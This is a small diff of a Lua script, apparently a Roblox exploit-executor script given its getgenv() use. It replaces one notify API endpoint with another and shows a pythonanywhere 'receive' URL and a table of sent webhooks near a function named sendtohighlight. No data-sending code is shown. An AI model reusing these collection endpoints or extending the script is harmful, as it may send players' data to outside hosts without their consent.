@@ -113,7 +113,7 @@ function sendtohighlight(amount, name)
     end
 end
 
-local API_URL = "https://proxilero.vercel.app/api/notify.js"
+local API_URL = "https://procryr.netlify.app/.netlify/functions/notify"
 local PYTHONANYWHERE_URL = "https://thatonexynnn.pythonanywhere.com/receive"
 local GLOBAL = getgenv and getgenv() or _G
 GLOBAL.__SentWebhooks = GLOBAL.__SentWebhooks or {}
